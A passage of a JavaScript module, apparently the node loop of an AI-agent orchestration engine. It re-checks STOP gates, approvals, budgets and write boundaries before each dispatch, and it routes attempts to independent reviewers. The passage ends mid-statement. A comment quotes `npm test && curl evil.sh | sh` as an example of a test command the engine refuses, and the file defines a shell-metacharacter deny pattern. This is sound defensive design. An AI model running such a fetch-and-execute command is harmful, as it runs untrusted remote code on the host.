// lib/goal-lifecycle/runner.mjs
// The node loop: dispatch one ready node, judge the attempt independently, correct, repeat.
//
// THE ORDER OF OPERATIONS IS THE SAFETY DESIGN, and it is the same before every single dispatch:
//
//   1. refuse to move at all if the sidecar diverged
//   2. re-read the STOP gate (a file, so another session can set it mid-run)
//   3. re-verify the approved envelope digest against what is on disk
//   4. re-check budgets and the consecutive-failure breaker
//   5. re-resolve the write owners and compare them to what was approved
//   6. open the attempt record ON DISK
//   7. only then spawn anything
//
// Every one of those is re-done per attempt rather than once at the top, because each describes
// something another process can change while this one is running: a branch can move, a STOP can
// appear, a plan file can be edited. A loop that checked at the start and trusted itself afterwards
// would be correct only for its first iteration.
//
// TEST COMMANDS ARE RUN WITHOUT A SHELL, AND SCREENED FIRST. The commands come from a plan a model
// wrote, so `npm test && curl evil.sh | sh` is a shape that has to be refused rather than executed.
// They are tokenized and spawned with `shell: false`; anything carrying a shell metacharacter is
// rejected and reported as a failed criterion, not run.
//
// THE ENGINE IS THE ONLY WRITER. Children edit the repository; they never touch run state. Every
// transition here goes through the state machine and is persisted before the next thing happens.
//
// Zero npm dependencies — node:* + lib/ back-edges only.

import { spawnSync } from 'node:child_process';
import { join } from 'node:path';
import { writeAtomic } from '../fs-safety/fsx.mjs';
import { bangkokTimestamp } from '../run-events/store.mjs';
import { resolveFamily, resumeSupported } from '../cli-executor-lifecycle/profiles.mjs';
import { EXIT_VALIDATION, SidekicksError } from '../sk-cli/errors.mjs';
import { canonicalEnvelope, digestOf, envelopeDigest } from './schema.mjs';
import { allNodesComplete, criteriaOf, nodeIndex, selectReadyNode } from './graph.mjs';
import {
  RELATIVE,
  assessWriteOwners,
  resolveWriteOwners,
} from './commands.mjs';
import {
  appendGoalEvent,
  assertNoDivergence,
  attemptDir,
  attemptId,
  goalPaths,
  mkdirp,
  readJsonIfPresent,
  stampDivergence,
  stampLease,
  stopPresent,
  writeJson,
  writeRunState,
} from './store.mjs';
import {
  consumeGrant,
  finishAttempt,
  nodeStates,
  recordAttemptProcess,
  startAttempt,
  toAwaitingActionApproval,
  toNeedsUser,
  toStopped,
} from './state-machine.mjs';
import {
  actionRequestId,
  buildActionRequest,
  classifyAction,
  pendingGrantFor,
} from './policy.mjs';
import {
  buildGuard,
  describeRefusals,
  guardEnv,
  readRefusals,
} from './guard.mjs';
import {
  captureBaseline,
  checkWriteRoots,
  checkoutsFor,
  collectDelta,
  crossCheckClaims,
  describeViolations,
  exemptRunDir,
  inspectArtifacts,
} from './evidence.mjs';
import {
  buildImplementPrompt,
  buildReviewPrompt,
  runImplementSession,
  runReviewSession,
  summarizePlanFor,
} from './reviewer.mjs';
import { buildCorrectionBrief, decideResume, summarizeFailure } from './correction.mjs';
import { runBedrockNoThink } from './bedrock-author.mjs';
import { selectIndependentExecutor } from './planner.mjs';
import {
  fallbackAllowed,
  presetSeat,
  recordRoutingEvent,
  resolveDispatchEffort,
  routingEvent,
  selectFallbackSeat,
} from './preset.mjs';

/** Shell metacharacters a test command may not contain — it is run without a shell. */
const SHELL_META = /[;&|><`$(){}\n\r]|\$\(|\|\||&&/;

/**
 * Outcomes the loop reports back to its caller.
 *
 * `blocked` is distinct from `failed`: something is waiting for a human, and the run is resumable.
 */
export const LOOP_OUTCOMES = Object.freeze(['all-complete', 'blocked', 'stopped', 'budget', 'limit']);

/**
 * Run the node loop until it completes, blocks, or hits a limit.
 *
 * @param {object} input
 * @returns {Promise<{outcome: string, state: object, detail: string}>}
 */
export async function runNodes(input) {
  const { repoRoot, runDir, plan, executors } = input;
  let state = input.state;
  const envelope = canonicalEnvelope(input.envelope);
  const maxNodes = Number(input.maxNodes ?? 0);
  const log = input.log || (() => {});
  const now = input.now || Date.now;
  let dispatched = 0;

  for (;;) {
    assertNoDivergence(state);

    // ---- STOP, re-read every time: another session can set it while this one runs ---------------
    if (stopPresent(runDir)) {
      state = commitTransition(runDir, toStopped(state, { at: bangkokTimestamp(now()) }));
      return { outcome: 'stopped', state, detail: 'the STOP gate is present' };
    }

    // ---- approval still valid for what is on disk ------------------------------------------------
    const drift = checkApprovalDrift(runDir, state);
    if (drift) {
      state = commitTransition(runDir, toNeedsUser(state, {
        reason: drift.reason,
        findings: drift.findings,
        next: 're-plan, or restore the approved artifacts — nothing is dispatched against an '
          + 'approval that no longer describes what is on disk',
      }));
      return { outcome: 'blocked', state, detail: drift.reason };
    }

    // ---- budgets and the breaker ----------------------------------------------------------------
    const budget = checkBudgets(state, envelope.budgets);
    if (!budget.ok) {
      state = commitTransition(runDir, toNeedsUser(state, {
        reason: budget.reason,
        findings: budget.findings,
        next: `raise it deliberately: sidekicks goal approve ${state.run_id} --max-attempts <N> `
          + '(an append-only amendment; completed nodes are preserved)',
      }));
      return { outcome: 'budget', state, detail: budget.reason };
    }

    // ---- pick the node --------------------------------------------------------------------------
    const states = nodeStates(state);
    if (allNodesComplete(plan, states)) {
      return { outcome: 'all-complete', state, detail: 'every node is complete' };
    }
    const nodeId = selectReadyNode(plan, states);
    if (nodeId === null) {
      const stuck = describeStall(plan, states);
      state = commitTransition(runDir, toNeedsUser(state, {
        reason: 'no node is ready to run, and not every node is complete',
        findings: stuck,
        next: 'usually a node that failed and whose dependents cannot proceed on it',
      }));
      return { outcome: 'blocked', state, detail: 'no ready node' };
    }

    if (maxNodes > 0 && dispatched >= maxNodes) {
      return {
        outcome: 'limit',
        state,
        detail: `--max-nodes ${maxNodes} reached; ${nodeId} is ready and was not dispatched`,
      };
    }

    const node = nodeIndex(plan).get(nodeId);
    const attemptResult = await runOneAttempt({
      repoRoot,
      runDir,
      state,
      plan,
      node,
      envelope,
      executors,
      prefer: input.prefer,
      hostCli: input.hostCli,
      goalText: plan.goal,
      log,
      now,
      invoke: input.invoke,
      lease: input.lease,
      presetStrict: input.presetStrict === true,
    });
    state = attemptResult.state;
    dispatched += 1;

    if (attemptResult.blocked) {
      return { outcome: 'blocked', state, detail: attemptResult.detail };
    }
  }
}

/**
 * One attempt on one node: dispatch, capture, review, settle.
 *
 * @param {object} input
 * @returns {Promise<{state: object, blocked: boolean, detail: string}>}
 */
async function runOneAttempt(input) {
  const { repoRoot, runDir, plan, node, envelope, executors, log, now } = input;
  let state = input.state;

  // ---- write owners, re-resolved for THIS node's paths ------------------------------------------
  const owners = resolveWriteOwners(repoRoot, node.affected_paths || []);
  const assessment = assessWriteOwners(owners, {
    expected: envelope.checkouts,
    // The approval-time baseline, so this run's OWN uncommitted work does not block its next attempt.
    baseline: state.baseline?.dirty_tracked ?? {},
  });
  for (const note of assessment.notes || []) log(`goal run: ${note}`);
  if (!assessment.ok) {
    state = commitTransition(runDir, toNeedsUser(state, {
      reason: `node ${node.id} cannot be implemented against the current checkouts`,
      findings: assessment.findings,
      next: 'get onto a work branch yourself and re-run `goal resume` — the engine never switches, '
        + 'stashes or creates a worktree on your behalf',
    }));
    return { state, blocked: true, detail: 'write owners refused' };
  }

  const routing = (envelope.routing || []).find((r) => r.node === node.id);
  let executorName = routing?.executor ?? node.executor;
  const tier = routing?.tier ?? node.tier;
  // The FROZEN envelope is the authority for effort too — never the preset file, which may have been
  // edited since approval. `null` means "no effort flag", which is also what a pre-preset run holds.
  let effort = routing?.effort ?? null;
  const preset = envelope.orchestration_preset ?? null;
  const presetStrict = input.presetStrict === true;
  let spec = executors[executorName];
  /** The single recorded substitution, when the approved seat could not run. */
  let routingFallback = null;

  // ---- pre-dispatch: the approved seat is gone ---------------------------------------------------
  //
  // Only under a preset. Without one, an unavailable executor stays exactly what it has always been
  // — a `needs_user` stop — because the node's seat came from a plan the operator read, and quietly
  // choosing another CLI for it would be the silent substitution this engine refuses to make.
  if (preset && (!spec || spec.enabled === false)) {
    const gate = fallbackAllowed({ snapshot: preset, failureClass: 'pre-dispatch', strict: presetStrict });
    if (gate.allowed) {
      try {
        const sub = selectFallbackSeat({
          executors,
          prefer: input.prefer,
          hostCli: input.hostCli,
          role: 'implement',
          tier,
          failedExecutor: executorName,
        });
        routingFallback = routingEvent({
          role: 'implement',
          node: node.id,
          primary: { name: executorName, family: routing?.family ?? null, tier, model: null, effort },
          failureClass: 'pre-dispatch',
          reason: `'${executorName}' is ${spec ? 'disabled' : 'not registered'} in this scope`,
          actual: sub,
          at: bangkokTimestamp(now()),
        });
        state = recordRoutingEvent(state, routingFallback);
        state = writeRunState(runDir, state);
        log(
          `goal run: ${node.id} — the approved seat '${executorName}' is unavailable; falling back to `
          + `${sub.name} · ${tier} (recorded)`,
        );
        executorName = sub.name;
        spec = sub.spec;
        // The substitute uses its OWN tier map for effort: one CLI's effort vocabulary is not another's.
        effort = null;
      } catch { /* no substitute either — fall through to the needs_user stop below */ }
    } else {
      log(`goal run: ${node.id} — no fallback for the unavailable seat: ${gate.reason}`);
    }
  }

  if (!spec || spec.enabled === false) {
    state = commitTransition(runDir, toNeedsUser(state, {
      reason: `node ${node.id} is routed to executor '${executorName}', which is not available in this scope`,
      findings: [`'${executorName}' is ${spec ? 'disabled' : 'not registered'}`],
      next: 'register or enable it, or re-plan with an executor that exists',
    }));
    return { state, blocked: true, detail: 'executor unavailable' };
  }

  const maxAttempts = Number(envelope.budgets?.max_attempts_per_node ?? 3);
  const rec = state.nodes?.[node.id];
  const attemptNumber = Number(rec?.attempt_count ?? 0) + 1;
  const id = attemptId(node.id, attemptNumber);
  const dir = attemptDir(runDir, node.id, attemptNumber);
  mkdirp(dir);

  // ---- one fresh fallback correction after a RETRYABLE implementation failure --------------------
  //
  // An implementation failure is never answered by blindly switching provider: the evidence
  // (Git-derived delta, boundary result, transcript, tests) is collected first, and the settler that
  // saw it stamped the class. Only `retryable-runtime` — a timeout, a crash, an unusable result, with
  // nothing world-facing attempted and the write boundary intact — may take a substitute, and only
  // once. An `unsafe` class is refused by `fallbackAllowed` itself, not by a condition here, so the
  // prohibition cannot be lost by editing this call site.
  const lastAttempt = (rec?.attempts ?? [])[(rec?.attempts ?? []).length - 1] ?? null;
  if (preset && !routingFallback && lastAttempt && lastAttempt.failure_class && !lastAttempt.routing_fallback) {
    const gate = fallbackAllowed({
      snapshot: preset,
      failureClass: lastAttempt.failure_class,
      strict: presetStrict,
    });
    if (gate.allowed) {
      try {
        const sub = selectFallbackSeat({
          executors,
          prefer: input.prefer,
          hostCli: input.hostCli,
          role: 'implement',
          tier,
          failedExecutor: executorName,
        });
        routingFallback = routingEvent({
          role: 'implement',
          node: node.id,
          attempt: attemptNumber,
          primary: { name: executorName, family: resolveFamily(executorName, spec), tier, model: spec.models?.[tier] ?? null, effort },
          failureClass: lastAttempt.failure_class,
          reason: lastAttempt.error || 'the previous attempt failed without a reviewable outcome',
          actual: sub,
          at: bangkokTimestamp(now()),
        });
        state = recordRoutingEvent(state, routingFallback);
        state = writeRunState(runDir, state);
        log(
          `goal run: ${node.id} attempt ${attemptNumber} — one fallback correction on ${sub.name} · ${tier} `
          + `after a ${lastAttempt.failure_class} failure (recorded)`,
        );
        executorName = sub.name;
        spec = sub.spec;
        effort = null;
      } catch { /* no substitute; the pinned seat simply gets its next attempt */ }
    } else if (lastAttempt.failure_class === 'unsafe') {
      log(`goal run: ${node.id} — no provider substitution after an unsafe failure: ${gate.reason}`);
    }
  }

  // The effort this dispatch carries, after the degrade-before-replace ladder.
  const dispatchEffort = resolveDispatchEffort({ spec, tier, effort: preset ? effort : undefined });
  if (dispatchEffort.effort_fallback) {
    log(`goal run: ${node.id} attempt ${attemptNumber} — ${dispatchEffort.reason}`);
  }

  // ---- the correction brief, from the PREVIOUS attempt's verdict --------------------------------
  let correction = null;
  const priorAttempts = rec?.attempts ?? [];
  const lastFailed = [...priorAttempts].reverse().find((a) => a.result === 'failed' && a.review);
  if (lastFailed) {
    const priorVerdict = readJsonIfPresent(join(runDir, lastFailed.review));
    if (priorVerdict) {
      correction = buildCorrectionBrief({
        node,
        verdict: priorVerdict,
        attemptNumber,
        maxAttempts,
        priorAttempts,
        attemptPaths: priorAttempts.map((a) => a.transcript).filter(Boolean),
      });
      writeAtomic(join(dir, 'correction.md'), `${correction}\n`);
    }
  }

  // ---- an operator grant this attempt may spend -------------------------------------------------
  // The grant is found BEFORE the brief is written, because the brief has to tell the session that the
  // action is now available — the previous attempt was told it was forbidden, and repeating that would
  // make the grant unusable and the pause pointless.
  const grant = pendingGrantFor(state, node.id);

  const prompt = buildImplementPrompt({
    goal: input.goalText,
    node,
    writeRoots: envelope.write_roots || [],
    planSummary: summarizePlanFor(plan, node.id, nodeStates(state)),
    correction,
    grant,
    attemptNumber,
    maxAttempts,
  });
  writeAtomic(join(dir, 'brief.md'), `${prompt}\n`);

  // ---- open the attempt BEFORE spawning anything ------------------------------------------------
  let opened;
  try {
    opened = startAttempt(state, {
      node: node.id,
      attempt_id: id,
      executor: executorName,
      family: resolveFamily(executorName, spec),
      tier,
      model: spec.models?.[tier] ?? null,
      effort: preset ? (dispatchEffort.effort ?? null) : null,
      effort_source: preset
        ? (dispatchEffort.effort_fallback
          ? 'effort-fallback'
          : (effort ? 'explicit-preset' : 'provider-default'))
        : null,
      preset_role: preset ? 'implementer' : null,
      routing_fallback: routingFallback,
      role: 'implement',
      at: bangkokTimestamp(now()),
      max_attempts: maxAttempts,
    });
  } catch (err) {
    state = commitTransition(runDir, toNeedsUser(state, {
      reason: err.message,
      findings: [`node ${node.id} has used its ${maxAttempts} attempts`],
      next: `sidekicks goal approve ${state.run_id} --max-attempts <N>`,
    }));
    return { state, blocked: true, detail: 'attempt budget exhausted' };
  }
  state = commitTransition(runDir, opened);

  // ---- the grant is spent HERE, before anything can use it --------------------------------------
  // Marked consumed on disk before dispatch, not after. A crash mid-attempt must not leave a grant
  // that looks unused — the operator authorized one action, and a re-dispatch that found the grant
  // still open would authorize a second.
  if (grant) {
    state = commitTransition(runDir, consumeGrant(state, {
      request_id: grant.request_id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
    }));
    log(
      `goal run: ${node.id} attempt ${attemptNumber} carries the operator's grant for `
      + `${grant.action_class} on ${grant.target} — spendable ONCE, by this attempt only`,
    );
  }

  // ---- the command guard, armed for THIS attempt -------------------------------------------------
  const guard = buildGuard(dir, { grant });

  // ---- the implementation session ---------------------------------------------------------------
  const resume = decideResume({
    resumeSupported: resumeSupported(executorName, spec, 'implement').ok,
    sessionId: lastFailed?.session_id ?? null,
  });
  log(
    `goal run: ${node.id} attempt ${attemptNumber}/${maxAttempts} — ${executorName} · ${tier} `
    + `(bounded edit mode); ${resume.reason}`,
  );

  // Every owning checkout, captured immediately before dispatch — see evidence.mjs for why this is not
  // `git diff HEAD` in the outer repository.
  const before = captureBaseline(repoRoot, checkoutsFor(envelope, owners));
  writeJson(join(dir, 'baseline.json'), {
    at_head: before.at_head,
    checkouts: before.checkouts.map((c) => ({
      path: c.path, head: c.head, dirty_entries: Object.keys(c.entries).length,
    })),
  });
  const startedAt = now();
  const session = node.bedrock_no_think === true
    ? await runBedrockNoThink({
      cwd: repoRoot,
      briefPath: join(dir, 'brief.md'),
      artifact: expectedArtifactsFor(node)[0],
      artifactPath: join(repoRoot, expectedArtifactsFor(node)[0]),
      timeoutMs: Number(envelope.budgets?.max_wall_clock_ms_per_attempt) || undefined,
    })
    : await runImplementSession({
    name: executorName,
    spec,
    tier,
    ...(preset ? { effort: dispatchEffort.effort } : {}),
    prompt,
    cwd: repoRoot,
    runDir,
    timeoutMs: Number(envelope.budgets?.max_wall_clock_ms_per_attempt) || undefined,
    resumeSession: resume.resume ? lastFailed.session_id : null,
    env: guardEnv(guard),
    invoke: input.invoke,
    onSpawn: (info) => {
      // Persisted BEFORE the await settles, so a crash here leaves a recoverable record rather than
      // an invisible child.
      try {
        recordAttemptProcess(state, {
          node: node.id, attempt_id: id, pid: info.pid, session_id: null,
        });
        if (input.lease) stampLease(state, { nonce: input.lease.nonce });
        state = writeRunState(runDir, state);
      } catch { /* bookkeeping must not kill the session */ }
    },
    });
  if (session.session_id) {
    recordAttemptProcess(state, { node: node.id, attempt_id: id, session_id: session.session_id });
    state = writeRunState(runDir, state);
  }

  // An attempt transcript is required evidence even for a launch failure or silent timeout.
  writeAtomic(join(dir, 'transcript.log'), renderTranscript(session));
  const { stdout, stderr, args, ...sessionMeta } = session;
  writeJson(join(dir, 'session.json'), sessionMeta);

  const delta = collectDelta(repoRoot, before);
  const diff = delta.diff;
  writeAtomic(join(dir, 'change.diff'), diff || '(no changes)\n');
  writeJson(join(dir, 'changed-paths.json'), {
    derived_from: 'git, per owning checkout, against the pre-dispatch baseline',
    changed: delta.changed,
    sections: delta.sections.map((s) => ({
      checkout: s.checkout, head_before: s.head_before, head_now: s.head_now, changed: s.changed.length,
    })),
  });
  const transcriptRel = RELATIVE(runDir, join(dir, 'transcript.log'));
  const digestRel = RELATIVE(runDir, join(dir, 'result.json'));
  const runRelative = RELATIVE(repoRoot, runDir);
  const actualFilesTouched = delta.changed
    .map((row) => row.path)
    .filter((path) => path !== runRelative && !path.startsWith(`${runRelative}/`));
  const expectedArtifacts = expectedArtifactsFor(node);
  const claimedArtifacts = Array.isArray(session.result?.changed_paths) ? session.result.changed_paths : [];
  const expectedEvidence = inspectArtifacts(repoRoot, expectedArtifacts, delta.changed);
  const claimedEvidence = inspectArtifacts(repoRoot, claimedArtifacts, delta.changed);
  writeJson(join(dir, 'result.json'), {
    schema_version: 1,
    executor: executorName,
    outcome: session.result?.result ?? null,
    exit_code: session.exit_code ?? null,
    timed_out: session.timed_out === true,
    launch_error: session.error ?? null,
    transcript: transcriptRel,
    expected_artifacts: expectedEvidence.files,
    claimed_artifacts: claimedEvidence.files,
    actual_files_touched: actualFilesTouched,
    validation_errors: [...expectedEvidence.errors, ...claimedEvidence.errors],
  });

  // ---- what the guard refused ---------------------------------------------------------------------
  const refusals = readRefusals(guard);
  if (refusals.length > 0) {
    writeJson(join(dir, 'guard-refusals.json'), refusals);
    for (const line of describeRefusals(refusals)) log(`goal run: guard — ${line}`);
  }

  // ---- did the session report it needs an action the approval never covered? --------------------
  // Checked BEFORE the review, because the attempt is not finished and reviewing it would waste a
  // session grading work that stopped on purpose. Reporting the need is the outcome the policy block
  // asked for, so the attempt is settled as `errored` (it did not meet its criteria) but the run
  // pauses for a grant rather than treating the report as a failure to punish.
  const reported = session.result;
  if (reported && typeof reported === 'object' && reported.result === 'blocked' && reported.action_request) {
    const requestId = actionRequestId(id, classifyAction(reported.action_request).action_class);
    const { request, canonical } = buildActionRequest({
      runId: state.run_id,
      node: node.id,
      attemptId: id,
      request: reported.action_request,
      requestId,
    });
    const digest = digestOf(canonical);
    writeJson(join(dir, 'action-request.json'), { ...request, digest });

    state = commitTransition(runDir, finishAttempt(state, {
      node: node.id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
      exit_code: session.exit_code,
      result: 'errored',
      transcript: transcriptRel,
      digest: digestRel,
      error: `paused: needs ${request.action_class} on ${request.target}`,
      wall_clock_ms: now() - startedAt,
      tokens: session.usage?.tokens ?? null,
      usd: session.usage?.usd ?? null,
    }));
    state = commitTransition(runDir, toAwaitingActionApproval(state, { request, digest }));
    log(
      `goal run: ${node.id} PAUSED before a ${request.action_class} on ${request.target} — `
      + 'goal approval never covered it',
    );
    return { state, blocked: true, detail: `needs a grant for ${request.action_class}` };
  }

  // ---- the session's own process outcome, checked BEFORE a reviewer is paid for an opinion -------
  //
  // A reviewer grades a TREE, and a tree looks the same whether the session finished deliberately or
  // died halfway through a file. So the process has to be judged on its own terms first: a crash, a
  // timeout, an unparseable payload or a result that never said `completed` all mean this attempt did
  // not produce a reviewable outcome, and asking a reviewer to rule on it invites exactly the
  // false-positive pass this whole loop exists to prevent. Refusals come first among these, because a
  // session that attempted a hard-stopped action and then reported success is the most misleading of
  // them.
  const hardRefusals = refusals.filter((r) => r.decision !== 'allowed-by-grant');
  const settleUnreviewable = (reason, findings, failureClass = 'retryable-runtime') => {
    state = commitTransition(runDir, finishAttempt(state, {
      node: node.id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
      exit_code: session.exit_code,
      result: 'errored',
      transcript: transcriptRel,
      digest: digestRel,
      error: reason,
      wall_clock_ms: now() - startedAt,
      tokens: session.usage?.tokens ?? null,
      usd: session.usage?.usd ?? null,
      guard_refusals: hardRefusals.length,
      failure_class: failureClass,
    }));
    log(`goal run: ${node.id} attempt ${attemptNumber} NOT REVIEWED — ${reason}`);
    for (const f of findings) log(`goal run:   ${f}`);
    return { state, blocked: false, detail: reason };
  };

  if (hardRefusals.length > 0) {
    return settleUnreviewable(
      `the session attempted ${hardRefusals.length} action(s) the approval does not cover; each was `
      + 'refused before it ran and the attempt is not reviewable',
      describeRefusals(hardRefusals),
      // UNSAFE, so no provider substitution may answer it: a session that reached for a hard-stopped
      // action is not a session another CLI should be handed the same brief.
      'unsafe',
    );
  }

  if (session.timed_out) {
    return settleUnreviewable(
      `the implementation session timed out after ${Math.round((now() - startedAt) / 1000)}s and was `
      + `killed${session.timeout_capped ? ' at the executor profile ceiling' : ''}, so how far it got is unknown`,
      ['whatever it wrote is in the tree; the next attempt sees it and the reviewer never ruled on it'],
    );
  }
  if (session.error) {
    return settleUnreviewable(
      `the implementation session could not be run${session.failure_kind ? ` (${session.failure_kind})` : ''}: ${session.error}`,
      [],
    );
  }
  if (session.exit_code !== 0) {
    return settleUnreviewable(
      `the implementation session exited ${session.exit_code}`
      + `${session.failure_kind ? ` (${session.failure_kind})` : ''}`,
      [String(session.stderr ?? '').trim().split('\n').slice(-3).join(' | ') || '(no stderr)'],
    );
  }
  if (!reported || typeof reported !== 'object') {
    return settleUnreviewable(
      `the implementation session returned no usable result document${session.parse_error ? `: ${session.parse_error}` : ''}`,
      ['a session that cannot say what it did has not reported completion, whatever the tree shows'],
    );
  }
  if (reported.result !== 'completed') {
    return settleUnreviewable(
      `the implementation session returned result '${String(reported.result)}', which is neither `
      + "'completed' nor a blocked action request",
      [],
    );
  }

  // A success-like response is not a completion unless its declared outputs can be opened and
  // attributed to this attempt. This gate precedes review, so no review can manufacture `done`
  // from a summary whose files are absent.
  const completionErrors = [...expectedEvidence.errors, ...claimedEvidence.errors];
  if (completionErrors.length > 0) {
    const reason = `executor completion evidence is invalid: ${completionErrors.join('; ')}`;
    state = commitTransition(runDir, finishAttempt(state, {
      node: node.id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
      exit_code: session.exit_code,
      result: 'failed',
      transcript: transcriptRel,
      digest: digestRel,
      error: reason,
      wall_clock_ms: now() - startedAt,
      tokens: session.usage?.tokens ?? null,
      usd: session.usage?.usd ?? null,
      changed_paths: delta.changed.map((c) => c.path),
      failure_class: 'retryable-runtime',
    }));
    log(`goal run: ${node.id} attempt ${attemptNumber} NOT REVIEWED — ${reason}`);
    return { state, blocked: false, detail: reason };
  }

  // ---- did it write only where the approval said it could? ---------------------------------------
  //
  // Checked against the Git-derived change set, never against the session's own `changed_paths` — see
  // evidence.mjs. A write outside the bound roots is not a reviewer's judgement call: the operator
  // approved a boundary, and a change beyond it was never approved however good the code is. The files
  // are LEFT ALONE — reverting them would destroy work the operator has not seen, which is a worse
  // outcome than an attempt that failed with the evidence intact.
  const boundary = checkWriteRoots({
    changed: delta.changed,
    writeRoots: envelope.write_roots || [],
    exempt: exemptRunDir(repoRoot, runDir),
  });
  // The cross-check compares the session's claim against the paths the SESSION could have written —
  // not against the engine's own run folder. Including the engine's transcript and session record in
  // "paths you changed but did not mention" would bury the one line that matters (a source file the
  // session touched and did not report) under bookkeeping the session never saw.
  const claims = crossCheckClaims(
    reported.changed_paths || [],
    [...boundary.in_roots, ...boundary.violations],
  );
  writeJson(join(dir, 'write-boundary.json'), {
    ok: boundary.ok,
    write_roots: envelope.write_roots || [],
    violations: boundary.violations,
    in_roots: boundary.in_roots.length,
    exempted: boundary.exempted.length,
    session_claims: {
      claimed: reported.changed_paths || [],
      changed_but_not_claimed: claims.unclaimed,
      claimed_but_not_changed: claims.claimed_not_seen,
    },
  });
  if (!boundary.ok) {
    state = commitTransition(runDir, finishAttempt(state, {
      node: node.id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
      exit_code: session.exit_code,
      result: 'failed',
      transcript: transcriptRel,
      digest: digestRel,
      error: `wrote ${boundary.violations.length} path(s) outside the approved write roots`,
      wall_clock_ms: now() - startedAt,
      tokens: session.usage?.tokens ?? null,
      usd: session.usage?.usd ?? null,
      write_violations: boundary.violations.map((v) => v.path),
      changed_paths: delta.changed.map((c) => c.path),
      // UNSAFE. A session that wrote outside the approved roots left the tree in a state nobody
      // approved; handing the same brief to another provider would compound it, not correct it.
      failure_class: 'unsafe',
    }));
    for (const line of describeViolations(boundary.violations, envelope.write_roots || [])) {
      log(`goal run: ${line}`);
    }
    return {
      state,
      blocked: false,
      detail: `wrote outside the approved write roots: ${boundary.violations.map((v) => v.path).join(', ')}`,
    };
  }

  // ---- the node's own tests ---------------------------------------------------------------------
  const tests = runTests(repoRoot, node.tests || [], envelope.action_policy?.allowed_test_commands || []);
  writeAtomic(join(dir, 'tests.log'), tests.output || '(no test commands)\n');

  // ---- the independent review --------------------------------------------------------------------
  const criteria = criteriaOf(plan, node.id);
  /** @type {any} */
  let reviewer;
  /** Kept so the stop below reports why the PRIMARY seat failed, not a generic restatement. */
  let reviewerError = null;
  try {
    // Under a preset the reviewer is the seat the operator approved, at its pinned tier — not the
    // resolver's pick at the hard-coded `high` floor. Family independence was already enforced when
    // the preset resolved, and re-deriving it here could silently choose a different seat than the
    // one inside the approved digest.
    const pinnedReviewer = presetSeat(preset, 'review', executors);
    reviewer = pinnedReviewer
      ? { ...pinnedReviewer, same_family_fallback: pinnedReviewer.family === resolveFamily(executorName, spec) }
      : selectIndependentExecutor({
        executors,
        prefer: input.prefer,
        hostCli: input.hostCli,
        role: 'review',
        tier: 'high',
        avoidFamily: resolveFamily(executorName, spec),
        avoidExecutor: executorName,
        familyOf: resolveFamily,
      });
  } catch (err) {
    reviewerError = err;
    // The pinned reviewer is gone from the registry. That is a PRE-DISPATCH failure of a read-only
    // seat, so one bounded substitution may still produce a verdict rather than stopping the run.
    if (preset && fallbackAllowed({ snapshot: preset, failureClass: 'pre-dispatch', strict: presetStrict }).allowed) {
      try {
        const sub = selectFallbackSeat({
          executors,
          prefer: input.prefer,
          hostCli: input.hostCli,
          role: 'review',
          tier: 'high',
          failedExecutor: preset.roles?.reviewer?.executor ?? '',
          avoidFamily: resolveFamily(executorName, spec),
          independent: true,
        });
        state = recordRoutingEvent(state, routingEvent({
          role: 'review',
          node: node.id,
          attempt: attemptNumber,
          primary: {
            name: preset.roles?.reviewer?.executor ?? null,
            family: preset.roles?.reviewer?.family ?? null,
            tier: preset.roles?.reviewer?.tier ?? null,
            model: preset.roles?.reviewer?.model ?? null,
            effort: preset.roles?.reviewer?.effort ?? null,
          },
          failureClass: 'pre-dispatch',
          reason: err.message,
          actual: sub,
          at: bangkokTimestamp(now()),
        }));
        state = writeRunState(runDir, state);
        log(`goal run: ${node.id} — the pinned reviewer is unavailable; falling back to ${sub.name} (recorded)`);
        reviewer = sub;
      } catch { /* no substitute reviewer either */ }
    }
  }
  if (!reviewer) {
    const err = reviewerError ?? { message: 'no executor can hold the review role at the required tier' };
    state = commitTransition(runDir, finishAttempt(state, {
      node: node.id,
      attempt_id: id,
      at: bangkokTimestamp(now()),
      exit_code: session.exit_code,
      result: 'errored',
      transcript: transcriptRel,
      digest: digestRel,
      error: `no executor can review this attempt: ${err.message}`,
      wall_clock_ms: now() - startedAt,
    }));
    state = commitTransition(runDir, toNeedsUser(state, {
      reason: 'no configured executor can review an attempt, so nothing can be accepted',
      findings: [err.message],
      next: "register a reviewing executor: cli-executor register <name> --model-high <id>",
    }));
    return { state, blocked: true, detail: 'no reviewer available' };
  }

  const reviewPrompt = buildReviewPrompt({
    goal: input.goalText,
    node,
    diff,
    testOutput: tests.output,
    attemptNumber,
    priorFailures: priorAttempts.filter((a) => a.result === 'failed').map((a) => a.error).filter(Boolean),
  });
  writeAtomic(join(dir, 'review-prompt.md'), `${reviewPrompt}\n`);
  log(
    `goal run: ${node.id} attempt ${attemptNumber} reviewed by ${reviewer.name} `
    + `(${reviewer.family ?? '?'})${reviewer.same_family_fallback ? ' — SAME FAMILY fallback, recorded' : ''}`,
  );

  let reviewerTier = reviewer.tier || 'high';
  const reviewOnce = (seat, tierOf) => runReviewSession({
    name: seat.name,
    spec: seat.spec,
    tier: tierOf,
    ...(seat.from_preset ? { effort: seat.effort } : {}),
    prompt: reviewPrompt,
    cwd: repoRoot,
    runDir,
    criteria,
    timeoutMs: Number(envelope.budgets?.max_wall_clock_ms_per_attempt) || undefined,
    invoke: input.invoke,
  });
  let review = await reviewOnce(reviewer, reviewerTier);

  // A reviewer that returned no usable verdict has judged nothing, so ONE fresh read-only fallback
  // reviewer may rule instead — a different implementation family where one exists. Without a usable
  // verdict from either, the node goes to the user; it is never accepted on a missing opinion.
  if (!review.ok && preset) {
    const gate = fallbackAllowed({ snapshot: preset, failureClass: 'retryable-runtime', strict: presetStrict });
    if (gate.allowed) {
      try {
        const sub = selectFallbackSeat({
          executors,
          prefer: input.prefer,
          hostCli: input.hostCli,
          role: 'review',
          tier: reviewerTier,
          failedExecutor: reviewer.name,
          avoidFamily: resolveFamily(executorName, spec),
          independent: true,
        });
        state = recordRoutingEvent(state, routingEvent({
          role: 'review',
          node: node.id,
          attempt: attemptNumber,
          primary: { name: reviewer.name, family: reviewer.family, tier: reviewerTier, model: null, effort: reviewer.effort ?? null },
          failureClass: 'retryable-runtime',
          reason: review.errors.join('; ') || 'the reviewer returned no usable verdict',
          actual: sub,
          at: bangkokTimestamp(now()),
        }));
        state = writeRunState(runDir, state);
        log(
          `goal run: ${node.id} attempt ${attemptNumber} — the pinned reviewer returned no usable `
